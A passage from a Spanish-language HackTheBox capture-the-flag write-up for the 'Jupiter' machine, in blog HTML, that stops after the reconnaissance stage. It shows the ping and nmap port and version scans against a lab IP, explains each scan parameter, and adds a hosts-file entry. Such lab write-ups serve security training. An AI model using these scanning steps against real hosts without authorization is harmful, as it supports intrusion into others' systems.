<!doctype html><html lang=en data-bs-theme=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/color-mode.86a91f050a481d0a3f0c72ac26543cb6228c770875981c58dcbc008fd3f875c8.js integrity="sha256-hqkfBQpIHQo/DHKsJlQ8tiKMdwh1mBxY3LwAj9P4dcg="></script><link rel=stylesheet href=/main.f123605798fa81252c4858ee022f36eeed1b8897d6e9a6e140622fb33c657296035adc9fa6d338de59d7586d3c3983fbfc6fff308e163a2b6cac9789aec8adfe.css integrity="sha512-8SNgV5j6gSUsSFjuAi827u0biJfW6abhQGIvszxlcpYDWtyfptM43lnXWG08OYP7/G//MI4WOitsrJeJrsit/g==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/writeups/hackthebox/jupiter/><title>Jupiter | d3b0o</title><meta name=description content><meta property="og:title" content="Jupiter"><meta property="og:description" content="Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
ping -c 1 10.10.11.216 PING 10."><meta property="og:type" content="article"><meta property="og:url" content="/writeups/hackthebox/jupiter/"><meta property="og:image" content="/writeups/hackthebox/jupiter/cover.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-11-01T00:00:00+00:00"><meta property="article:modified_time" content="2023-11-01T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/writeups/hackthebox/jupiter/cover.png"><meta name=twitter:title content="Jupiter"><meta name=twitter:description content="Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
ping -c 1 10.10.11.216 PING 10."><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3b0o","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/hackthebox/","name":"Hack the Box","position":3},{"@type":"ListItem","name":"Jupiter","position":4}]}</script></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3b0o</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded active" href=/writeups/hackthebox/jupiter/>Jupiter</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/>Toolbox</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/>Pandora (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/>Horizontall (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/>Bashed (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/blue/>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/tryhackme/blue/>Blue</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/>Chill Hack</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/team/>Team</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/startup/>Startup</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/source/>Source</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/>Mustacchio</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/>Wonderland</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/>Bounty Hacker</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/overpass/>Overpass</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/develpy/>Develpy</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/>Tomghost</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wgel/>Wgel</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/gallery/>Gallery</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/>Mr.Robot</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/>Agent T</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/>Vulnversity</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/>Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/>Agent sudo</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/>Lazy admin</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/>Chocolate Factory</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/rootme/>RootMe</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/>Pickle Rick</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3b0o</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class="nav-link active" href=/writeups/hackthebox/jupiter/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button id=buttonColorMode class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type=button aria-label="Toggle theme"><svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/></svg><svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-4 0a4 4 0 108 0 4 4 0 10-8 0m-5 0h1m8-9v1m8 8h1m-9 8v1M5.6 5.6l.7.7m12.1-.7-.7.7m0 11.4.7.7m-12.1-.7-.7.7"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class=content>Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded active" href=/writeups/hackthebox/jupiter/>Jupiter</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/toolbox/>Toolbox</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/>Pandora (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/>Horizontall (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/>Bashed (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/blue/>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/tryhackme/blue/>Blue</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/>Chill Hack</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/team/>Team</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/startup/>Startup</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/source/>Source</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/>Mustacchio</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/>Wonderland</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/>Bounty Hacker</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/overpass/>Overpass</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/develpy/>Develpy</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/>Tomghost</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wgel/>Wgel</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/gallery/>Gallery</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/>Mr.Robot</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/>Agent T</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/>Vulnversity</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/>Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/>Agent sudo</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/>Lazy admin</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/>Chocolate Factory</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/rootme/>RootMe</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/>Pickle Rick</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#http>HTTP</a></li></ul></li><li><a href=#intrusión>Intrusión</a><ul><li><a href=#reverse-shell>Reverse shell</a></li></ul></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><a href=#juno>juno</a></li><li><a href=#jovian>jovian</a></li><li><a href=#root>root</a></li></ul></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/writeups/>Writeups</a></li><li class=breadcrumb-item><a href=/writeups/hackthebox/>HackTheBox</a></li><li class="breadcrumb-item active" aria-current=page>Jupiter</li></ol></nav><h1>Jupiter</h1><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#http>HTTP</a></li></ul></li><li><a href=#intrusión>Intrusión</a><ul><li><a href=#reverse-shell>Reverse shell</a></li></ul></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><a href=#juno>juno</a></li><li><a href=#jovian>jovian</a></li><li><a href=#root>root</a></li></ul></li></ul></li></ul></nav></div></details></nav><h2 id=reconocimiento>Reconocimiento<a href=#reconocimiento class=anchor aria-hidden=true>#</a></h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ping -c <span class=m>1</span> 10.10.11.216
</span></span><span class=line><span class=cl>PING 10.10.11.216 <span class=o>(</span>10.10.11.216<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.11.216: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span><span class=m>174</span> ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.11.216 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 174.469/174.469/174.469/0.000 ms
</span></span></code></pre></div><p>Tenemos conexión y en este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong></p><h3 id=escaneo-de-puertos>Escaneo de puertos<a href=#escaneo-de-puertos class=anchor aria-hidden=true>#</a></h3><p>Ahora empezamos con un escaneo de puertos</p><pre tabindex=0><code>$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.216 -oG allPorts
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-p-</td><td>Para que el escaneo sea a todos los puertos (65536)</td></tr><tr><td>&ndash;open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td>&ndash;min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td>-n</td><td>Omitir resolución DNS</td></tr><tr><td>-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td>-Pn</td><td>Para saltar la comprobación de sí la máquina está activa o no</td></tr><tr><td>-oG allPorts</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td></tr></tbody></table></details><br><p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p><p><a href=https://pastebin.com/tYpwpauW>Función extractPorts</a> de <a href=https://s4vitar.github.io>@s4vitar</a></p><pre tabindex=0><code>extractPorts allPorts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.216
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -p22,80 -sCV 10.10.11.216 -oN versions
</span></span><span class=line><span class=cl>Starting Nmap 7.94 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-11-01 17:21 CET
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.216
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.099s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://jupiter.htb/
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-p</td><td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td></tr><tr><td style=text-align:center>-sC</td><td>Para que realice scripts básicos de reconocimiento</td></tr><tr><td style=text-align:center>-sV</td><td>Proporciona la versión e información de los servicios que corren por los puertos</td></tr></tbody></table></details><br><h3 id=http>HTTP<a href=#http class=anchor aria-hidden=true>#</a></h3><p>El nmap reporto que el puerto 80 estaba abierto y que no se hacía el redirect a jupiter.htb. Esto significa que el servidor puede estar usando virtual hosting</p><details><summary>Qué es virtual hosting?</summary><p>El virtualhost, o servidor virtual, es una forma de alojamiento web que permite que varias páginas web puedan funcionar en una misma máquina. Hay dos tipos de virtualhost:</p><ul><li>Los que se basan en direcciones IP, donde cada página web tendrá una IP diferente.</li><li>Los que se basan en nombres de dominio, donde una sola dirección IP funcionan varias páginas web.</li></ul><p>Definición sacada de: https://linube.com/ayuda/articulo/267/que-es-un-virtualhost</p></details><br><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http-title: Did not follow redirect to http://jupiter.htb/
</span></span></code></pre></div><p>Para solucionar esto hay que añadir en el /etc/hosts la siguiente línea:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>10.10.11.216 jupiter.htb
